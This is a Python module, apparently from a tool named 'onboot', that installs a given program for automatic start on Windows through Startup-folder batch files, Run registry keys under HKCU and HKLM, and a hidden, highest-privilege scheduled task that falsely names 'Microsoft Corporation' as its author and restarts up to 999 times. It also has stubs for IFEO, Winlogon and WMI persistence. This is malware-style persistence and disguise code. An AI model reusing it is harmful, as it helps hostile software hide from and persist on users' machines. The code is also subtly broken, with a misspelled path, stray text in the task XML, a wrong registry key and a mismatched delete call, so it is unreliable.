import winreg
from getpass import getuser
from os import remove
from subprocess import check_output

from onboot import Installer, random_str


class StartMenuInstaller(Installer):
    autostart_directory = f"C:\\Users\\{getuser()}\\AppData\\Roaming\\icrosoft\\Windows\\Start Menu\\Programs\\Startup"

    def get_autostart_path(self):
        return f"{self.autostart_directory}\\{self.config.name}.bat"

    def install(self) -> bool:
        try:
            with open(self.get_autostart_path(), "w+") as o:
                o.write(f'start "" {self.config.get_path()}')
            return True
        except Exception as e:
            print(e)
            return False


class HKCUInstaller(Installer):
    autostart_directory = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    registry = winreg.HKEY_CURRENT_USER

    def install(self) -> bool:
        k = winreg.OpenKey(self.registry, self.autostart_directory, 0, winreg.KEY_ALL_ACCESS)
        winreg.SetValueEx(k, self.config.name, 0, winreg.REG_SZ, self.config.get_path())
        winreg.CloseKey(k)
        return True

    def uninstall(self) -> bool:
        k = winreg.OpenKey(self.registry, self.autostart_directory, 0, winreg.KEY_ALL_ACCESS)
        winreg.DeleteKey(k, self.config.name)
        winreg.CloseKey(k)
        return True

    def is_supported(self) -> bool:
        return True


class HKLMInstaller(HKCUInstaller):
    registry = winreg.HKEY_LOCAL_MACHINE

    def is_supported(self) -> bool:
        return self.is_root()


class IFEOInstaller(HKLMInstaller):  # TODO
    autostart_directory = "Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility"

    def is_supported(self) -> bool:
        return False


class UserInitInstaller(HKLMInstaller):  # TODO
    autostart_directory = "Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"

    def is_supported(self) -> bool:
        return False


class WMICInstaller(Installer):  # TODO
    def is_supported(self) -> bool:
        return False


class SchTaskInstaller(Installer):
    def generate_task_xml(self, work_dir: str = "", author: str = "Microsoft Corporation", description: str = ""):
        if work_dir == "":
            work_dir = self.config.get_path()
        return f'''
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.3" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Author>{author}</Author>
    <Description>{description}</Description>
    <URI>\\{self.config.name}</URI>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
      <Delay>PT1M</Delay>
    </LogonTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>StopExisting</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>
    <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>
    <Priority>2</Priority>
    <RestartOnFailure>main
      <Interval>PT1M</Interval>
      <Count>999</Count>
    </RestartOnFailure>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>{self.config.get_path()}</Command>
      <WorkingDirectory>{work_dir}</WorkingDirectory>
    </Exec>
  </Actions>
</Task>
'''

    def install(self) -> bool:
        try:
            fp = f"%APPDATA%\\{random_str()}.xml"
            with open(fp, "w") as o:
                o.write(self.generate_task_xml())
            check_output(f"cmd /C schtasks /create /xml {fp} /tn {self.config.name}", shell=True)
            remove(fp)
            return True
        except Exception as e:
            print(e)
            return False

    def uninstall(self) -> bool:
        try:
            check_output(f'cmd /C schtasks /delete /tn "{self.config.name}"')
            return True
        except Exception as e:
            print(e)
            return False

    def is_supported(self) -> bool:
        return True


class WindowsInstaller(Installer):
    def install_cortana(self):
        pass

    def install_people(self):
        pass

    def install_ifeo(self):
        pass

    def install_userinit(self):
        pass

    def install_wmic(self):
        pass
